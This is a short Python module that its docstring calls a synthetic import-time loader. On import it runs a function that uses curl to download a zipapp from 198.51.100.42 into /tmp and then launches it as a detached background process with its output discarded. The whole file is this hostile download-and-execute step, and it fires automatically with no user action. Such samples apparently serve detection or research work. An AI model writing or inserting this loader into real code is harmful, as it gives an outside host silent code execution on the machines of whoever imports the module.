"""Synthetic import-time detached Python zipapp loader."""
import subprocess
import sys


def _start_helper():
    source = "http://198.51.100.42/helper.pyz"
    destination = "/tmp/helper.pyz"
    subprocess.run(["curl", "-s", "-L", source, "-o", destination])
    subprocess.Popen(
        [sys.executable, destination],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,
    )


_start_helper()
